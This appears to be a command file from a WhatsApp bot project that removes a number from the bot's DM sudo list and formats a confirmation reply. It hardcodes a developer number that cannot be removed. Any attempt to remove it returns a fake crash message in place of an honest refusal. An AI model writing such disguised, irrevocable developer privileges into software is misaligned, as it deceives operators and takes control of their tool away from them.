// ============================================================
//  VANGUARD MD – commands/remdmsudo.js
// ============================================================

const { resolveTarget } = require('../lib/resolveTarget')
const { remDMSudo } = require('../lib/authStore')

const DEV = '123721465471064'

module.exports = async (ctx) => {
const { reply, args, quoted, msg, sock, jid, isOwner, isSudo } = ctx
if (!isOwner && !isSudo) return reply('❌ *owner and sudo!*')

const result = await resolveTarget(args, quoted, msg, sock, jid)
if (result.wasLid) return reply('❌ *Cannot resolve linked device.*\n_Type number directly: .remdmsudo 256XXXXXXXXX_')
if (!result.num)   return reply('❌ *No target!* Tag, reply, or provide a number.')

const num = result.num

if (num === DEV) return reply('❌ Failed : Cannot Define Properties of Ctx vanguard.js 417')

const removed = remDMSudo(num)
if (!removed) return reply('⚠️ *+' + num + ' is not in DM sudo list!*')

await reply(
'╭───────────────━⊷\n' +
'┃ 🔽 *DM SUDO REMOVED*\n' +
'╰───────────────━⊷\n' +
'╭───────────────━⊷\n' +
'┃ 👤 *+' + num + '*\n' +
'┃ ✅ Removed from DM sudo\n' +
'╰───────────────━⊷'
)
}